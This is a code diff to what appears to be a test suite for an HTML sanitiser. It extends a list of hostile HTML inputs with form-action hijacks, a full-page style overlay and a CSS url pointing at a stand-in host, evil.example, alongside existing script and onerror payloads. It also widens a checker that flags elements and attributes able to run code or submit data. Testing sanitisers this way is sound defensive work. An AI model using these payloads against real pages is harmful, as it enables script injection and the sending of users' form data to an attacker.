@@ -67,6 +67,10 @@ export const RAW_HTML = [
   "<base href=//evil.example>",
   "<meta http-equiv=refresh content=0;url=//evil.example>",
   "<form action=//evil.example><input name=p></form>",
+  "<button formaction=//evil.example>x</button>",
+  "<input form=f formaction=//evil.example type=submit>",
+  '<div style="position:fixed;inset:0;z-index:9">x</div>',
+  '<p style="background:url(//evil.example/x)">x</p>',
   "<textarea><script>",
   '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
   "<template><script>alert(1)</script></template>",
@@ -118,8 +122,10 @@ export const PIECES = [
 
 // What in a sanitised tree could run something: an element that runs or
 // loads a document, an on* attribute, or a URL with a scheme that runs,
-// anywhere a URL goes. The problems found; none when it's safe.
-const RUNS = new Set(["script", "iframe", "frame", "frameset", "object", "embed", "applet", "base", "meta", "link", "portal"]);
+// anywhere a URL goes; or reach past where it's drawn: a <style> (the
+// whole page's), a style attribute (a box over the page) or a form and
+// what submits one. The problems found; none when it's safe.
+const RUNS = new Set(["script", "iframe", "frame", "frameset", "object", "embed", "applet", "base", "meta", "link", "portal", "style", "form"]);
 const URL_ATTRS = new Set(["href", "src", "action", "formaction", "xlink:href", "data", "poster", "background", "ping", "srcset", "lowsrc", "dynsrc", "cite", "longdesc"]);
 export function executable(root: Element): string[] {
   const out: string[] = [];
@@ -130,7 +136,7 @@ export function executable(root: Element): string[] {
       const n = name.toLowerCase();
       if (n.startsWith("on")) out.push(`${n} on <${tag}>`);
       if (n === "srcdoc") out.push(`srcdoc on <${tag}>`);
-      if (n === "style" && /expression\(|javascript:|url\(/i.test(value)) out.push(`style ${value}`);
+      if (n === "style" || n === "form" || n === "formaction") out.push(`${n}=${value} on <${tag}>`);
       // What the browser would make of it: control characters and spaces in
       // a scheme are dropped.
       const url = value.replace(/[\u0000- \u007f-\u009f]/g, "").toLowerCase();
